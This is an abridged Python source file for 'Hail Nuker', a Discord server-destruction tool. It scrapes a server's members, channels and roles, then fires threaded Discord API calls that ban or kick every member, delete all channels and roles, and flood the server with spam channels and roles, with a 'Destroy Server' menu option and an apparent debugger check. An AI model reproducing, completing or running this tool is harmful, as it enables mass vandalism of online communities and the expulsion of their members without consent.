...
os.system(f'cls & mode 85,20 & title [Hail Nuker] - Configuration')
...
def updateCheck():
	...
	if version in r.text:
		...
		print(
		    f"\x1b[38;5;56m[\033[37m!\x1b[38;5;56m] \033[37mNew Update Available. Download From: \x1b[38;5;56mgithub.com/drax\hailnuker\033[37m"
		)
		os.system('start https://github.com/drax/HailNuker/releases')
		input()
		os._exit(0)
...
rich_presence = input(
    f'\x1b[38;5;56m> \033[37mRich Presence (\x1b[38;5;56mY\033[37m/\x1b[38;5;56mN\033[37m)\x1b[38;5;56m: \033[37m'
)
	...
	if rich_presence == "y" or rich_presence == "Y":
		try:
			...
			RPC.update(details="Connected",
			           large_image="haillarge2",
			           small_image="hail",
			           large_text="github.com/drax/HailNuker",
			           start=time.time())
		except:
			pass
...
class Hail:
		...
		while True:
			...
			if 'retry_after' in r.text:
				...
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					print(
					    f"{self.colour}[\033[37m+{self.colour}]\033[37m Banned{self.colour} {member.strip()}\033[37m"
					)
					break
				else:
					break
	...
	def KickMembers(self, guild, member):
		while True:
			...
			if 'retry_after' in r.text:
				...
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					print(
					    f"{self.colour}[\033[37m+{self.colour}]\033[37m Kicked{self.colour} {member.strip()}\033[37m"
					)
					break
				else:
					break
	...
	def DeleteChannels(self, guild, channel):
		while True:
			r = requests.delete(
			    f"https://discord.com/api/v8/channels/{channel}",
			    headers=headers)
			if 'retry_after' in r.text:
				time.sleep(r.json()['retry_after'])
			else:
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					print(
					    f"{self.colour}[\033[37m+{self.colour}]\033[37m Deleted Channel {self.colour}{channel.strip()}\033[37m"
					)
					break
				else:
					break
	...
	def DeleteRoles(self, guild, role):
		while True:
			r = requests.delete(
			    f"https://discord.com/api/v8/guilds/{guild}/roles/{role}",
			    headers=headers)
			if 'retry_after' in r.text:
				time.sleep(r.json()['retry_after'])
			else:
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					print(
					    f"{self.colour}[\033[37m+{self.colour}]\033[37m Deleted Role{self.colour} {role.strip()}\033[37m"
					)
					break
				else:
					break
	...
	def SpamChannels(self, guild, name):
		while True:
			...
			if 'retry_after' in r.text:
				...
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					print(
					    f"{self.colour}[\033[37m+{self.colour}]\033[37m Created Channel{self.colour} {name}\033[37m"
					)
					break
				else:
					break
	...
	def SpamRoles(self, guild, name):
		while True:
			json = {'name': name}
			r = requests.post(
			    f'https://discord.com/api/v8/guilds/{guild}/roles',
			    headers=headers,
			    json=json)
			if 'retry_after' in r.text:
				time.sleep(r.json()['retry_after'])
				...
				if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
					print(
					    f"{self.colour}[\033[37m+{self.colour}]\033[37m Created Role{self.colour} {name}\033[37m"
					)
					break
				else:
					break
	...
	async def Scrape(self):
		guild = input(
		    f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
		...
		with open('Scraped/channels.txt', 'a') as c:
			for channel in guildOBJ.channels:
				...
				channelcount += 1
			print(
			    f"{self.colour}[\033[37m!{self.colour}]\033[37m Scraped {self.colour}{channelcount}\033[37m Channels"
			)
			c.close()
		...
		with open('Scraped/roles.txt', 'a') as r:
			for role in guildOBJ.roles:
				...
				rolecount += 1
			print(
			    f"{self.colour}[\033[37m!{self.colour}]\033[37m Scraped {self.colour}{rolecount}\033[37m Roles\n"
			)
			r.close()
	...
	async def NukeExecute(self):
		guild = input(
		    f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
		channel_name = input(
		    f"{self.colour}> \033[37mChannel Names{self.colour}: \033[37m")
		channel_amount = input(
		    f"{self.colour}> \033[37mChannel Amount{self.colour}: \033[37m")
		role_name = input(
		    f"{self.colour}> \033[37mRole Names{self.colour}: \033[37m")
		role_amount = input(
		    f"{self.colour}> \033[37mRole Amount{self.colour}: \033[37m")
		print()
		...
		for member in members:
			threading.Thread(target=self.BanMembers, args=(
			    guild,
			    member,
			)).start()
		for channel in channels:
			threading.Thread(target=self.DeleteChannels,
			                 args=(
			                     guild,
			                     channel,
			                 )).start()
		for role in roles:
			threading.Thread(target=self.DeleteRoles, args=(
			    guild,
			    role,
			)).start()
		for i in range(int(channel_amount)):
			threading.Thread(target=self.SpamChannels,
			                 args=(
			                     guild,
			                     channel_name,
			                 )).start()
		for i in range(int(role_amount)):
			threading.Thread(target=self.SpamRoles, args=(
			    guild,
			    role_name,
			)).start()
		members.close()
	...
	async def KickExecute(self):
		...
		members = open('Scraped/members.txt')
		for member in members:
			threading.Thread(target=self.KickMembers, args=(
			    guild,
			    member,
			)).start()
		members.close()
	...
	async def ChannelSpamExecute(self):
		...
		for i in range(int(amount)):
			threading.Thread(target=self.SpamChannels, args=(
			    guild,
			    name,
			)).start()
	...
	def Credits(self):
		os.system(f'cls & mode 85,20 & title [Hail Nuker] - Credits')
		print(f'''
                          {self.colour}
...
╚═╝░░╚═╝  ╚═╝░░╚═╝  ╚═╝  ╚══════╝░░░╚═╝░░░╚══════╝
                          ...
                          \033[37m
                            ...
                            {self.colour}[\033[37mDiscord{self.colour}] \033[37mdraxu#6999
                            {self.colour}[\033[37mGithub{self.colour}] \033[37mdrax0777

        \033[37m''')

	async def ThemeChanger(self):
		os.system(f'cls & mode 85,20 & title [Hail Nuker] - Themes')
		print(f'''
                          {self.colour}
...
╚═╝░░╚═╝  ╚═╝░░╚═╝  ╚═╝  ╚══════╝░░░╚═╝░░░╚══════╝
	...
	async def Menu(self):
		os.system(
		    f'cls & mode 85,20 & title [Hail Nuker] - Connected: {client.user}'
		)
		print(f'''
                          {self.colour}
...
╚═╝░░╚═╝  ╚═╝░░╚═╝  ╚═╝  ╚══════╝░░░╚═╝░░░╚══════╝
      ...
      {self.colour}
      {self.colour} \033[37m[{self.colour}1\033[37m] \033[37mBan All       {self.colour} \033[37m [{self.colour}5\033[37m] \033[37mDel Channels  {self.colour} \033[37m [{self.colour}9\033[37m] \033[37mScrape info       {self.colour} \033[37m
      {self.colour}  \033[37m[{self.colour}2\033[37m] \033[37mKick All      {self.colour} \033[37m [{self.colour}6\033[37m] \033[37mCreate MassRoles      {self.colour} \033[37m [{self.colour}0\033[37m] \033[37mChange Themes     {self.colour} \033[37m
      {self.colour} \033[37m[{self.colour}3\033[37m] \03Prune Mems     {self.colour} \033[37m [{self.colour}7\033[37m] \033[37mCreate MassChannels   {self.colour} \033[37m [{self.colour}C\033[37m] \033[37mView Credits      {self.colour} \033[37m
      {self.colour} \033[37m[{self.colour}4\033[37m] \033[37mDel Roles      {self.colour} \033[37m [{self.colour}8\033[37m] \033[37mDestroy Server       {self.colour} \033[37m [{self.colour}X\033[37m] \033[37mTurn Off Nuker              {self.colour} \033[37m
      {self.colour}
...
if __name__ == "__main__":
	...
	loop.create_task(Hail().DebuggerCheck())
	Hail().Startup()
